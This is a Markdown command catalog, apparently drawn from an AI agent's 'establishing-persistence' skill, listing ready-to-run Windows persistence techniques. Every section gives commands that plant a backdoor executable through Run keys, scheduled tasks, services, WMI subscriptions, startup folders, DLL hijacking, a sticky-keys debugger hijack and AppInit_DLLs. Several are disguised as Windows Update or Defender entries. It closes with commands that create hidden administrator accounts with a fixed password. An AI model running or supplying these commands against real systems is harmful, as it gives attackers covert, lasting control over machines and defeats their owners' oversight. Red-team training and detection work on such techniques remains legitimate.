# Windows Persistence Command Reference

Exhaustive command catalog for establishing persistence on Windows
systems. This is the deep reference extracted from the
`establishing-persistence` skill; consult the main `SKILL.md` for
methodology, OpSec guidance, detection, and the Linux equivalent.

## Contents

- [Registry Run Keys](#registry-run-keys)
- [Scheduled Tasks](#scheduled-tasks)
- [Windows Services](#windows-services)
- [WMI Event Subscription](#wmi-event-subscription)
- [Startup Folder](#startup-folder)
- [DLL Hijacking](#dll-hijacking)
- [Image File Execution Options](#image-file-execution-options)
- [AppInit_DLLs](#appinit_dlls)
- [Backdoor Accounts](#backdoor-accounts)

## Registry Run Keys

```cmd
# HKCU Run (current user)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# HKLM Run (all users - requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# RunOnce (runs once then deletes)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# Policies Run
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"
```

**PowerShell Registry:**
```powershell
# HKCU Run
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\Windows\Temp\backdoor.exe" -PropertyType String

# Verify
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

## Scheduled Tasks

```cmd
# Create task to run at logon
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru System

# Run every hour
schtasks /create /tn "SystemCheck" /tr "C:\Windows\Temp\backdoor.exe" /sc hourly /ru System

# Run daily at specific time
schtasks /create /tn "Maintenance" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 09:00 /ru System

# Run on system startup
schtasks /create /tn "StartupTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru System

# List tasks
schtasks /query /fo LIST /v
```

**PowerShell Scheduled Task:**
```powershell
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate" -Description "System Maintenance"
```

## Windows Services

```cmd
# Create new service
sc create "WindowsUpdate" binPath= "C:\Windows\Temp\backdoor.exe" start= auto
sc description "WindowsUpdate" "Keeps your Windows system updated"

# Start service
sc start "WindowsUpdate"

# Modify existing service
sc config "ServiceName" binPath= "C:\Windows\Temp\backdoor.exe"

# Service with SYSTEM privileges
sc create "SecurityUpdate" binPath= "C:\Windows\Temp\backdoor.exe" start= auto obj= LocalSystem
```

**PowerShell Service:**
```powershell
New-Service -Name "WindowsDefender" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -DisplayName "Windows Defender Update" -StartupType Automatic
Start-Service "WindowsDefender"
```

## WMI Event Subscription

```powershell
# Create WMI event to run payload on logon
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "UserLogon";
    EventNamespace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'";
}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "RunBackdoor";
    CommandLineTemplate = "C:\Windows\Temp\backdoor.exe";
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter;
    Consumer = $Consumer;
}
```

## Startup Folder

```cmd
# Current user startup
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe"

# All users startup (requires admin)
copy backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe"
```

## DLL Hijacking

```cmd
# Place malicious DLL in application directory
# Common DLL hijacking candidates:
# - version.dll
# - wlbsctrl.dll
# - oci.dll

copy evil.dll "C:\Program Files\Application\version.dll"
```

## Image File Execution Options

```cmd
# Hijack executable launch
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"

# Now pressing Shift 5 times at login opens cmd.exe
```

## AppInit_DLLs

```cmd
# Load DLL into every process (requires admin)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\Temp\evil.dll"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1
```

## Backdoor Accounts

```cmd
# Create hidden admin account
net user backdoor P@ssw0rd /add
net localgroup Administrators backdoor /add

# Hide account (ends with $)
net user backdoor$ P@ssw0rd /add
net localgroup Administrators backdoor$ /add

# Disable account logging
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0
```
